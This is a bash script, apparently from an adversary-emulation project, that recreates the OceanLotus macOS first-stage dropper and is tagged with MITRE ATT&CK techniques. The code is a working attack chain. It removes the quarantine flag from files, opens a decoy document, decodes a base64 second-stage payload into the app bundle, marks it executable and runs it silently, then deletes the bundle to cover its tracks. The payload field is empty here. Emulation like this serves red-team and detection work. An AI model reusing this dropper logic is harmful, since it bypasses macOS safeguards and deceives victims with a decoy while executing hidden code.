# ---------------------------------------------------------------------------
# first_stage.sh - Executed as part of the OceanLotus application bundle initial access vector

# Usage: ./first_stage.sh

# MITRE ATT&CK Techniques:
#   T1036.008 Masquerading: Masquerade File Type
#   T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

# Resources:
#   https://otx.alienvault.com/indicator/file/be43be21355fb5cc086da7cee667d6e7
#   https://www.virustotal.com/gui/file/48e3609f543ea4a8de0c9375fa665ceb6d2dfc0085ee90fa22ffaced0c770c4f/detection
#   https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html

# Revision History:

# --------------------------------------------------------------------------- 

#!/bin/bash
current_directory="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
current_file="$( basename "${BASH_SOURCE[0]}" )"

# base64 encoded second stage payload
b64_stuff=""

# points to decoy doc in application bundle
TEMPPATH_IOP="Contents/Resources/default.config"
# name of decoy document to drop
doc_name="Decoy.doc"
# filename of second stage (currently just b64(oceanlotus23))
temp_var="b2NlYW5sb3R1czIz"

# remove quarantine flag on application bundle
#   MITRE ATT&CK Techniques:
#     T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
find . -exec xattr -d com.apple.quarantine {} + >/dev/null 2>&1 &

# get path to the application bundle
parent_path_copy="$( dirname "$current_directory/$current_file" )"
parent_path_copy="$( dirname "$parent_path_copy" )"
parent_parent_path="$( dirname "$parent_path_copy" )"

# copy decoy doc to tmp and open it
cp "$parent_path_copy/$TEMPPATH_IOP" "/tmp/$doc_name" && open -n "/tmp/$doc_name"

# replace decoy doc in application bundle with decoded second stage, make executable, then attempt to execute in background
echo $b64_stuff | base64 -D > "$parent_path_copy/$TEMPPATH_IOP" && chmod +x "$parent_path_copy/$TEMPPATH_IOP" && "$parent_path_copy/$TEMPPATH_IOP" >/dev/null 2>&1 &

# remove application bundle then move decoy doc from tmp to the current execution path
sleep 5 ; rm -rf "$parent_path_copy" ; mv "/tmp/$doc_name" "$parent_parent_path/$doc_name" ;
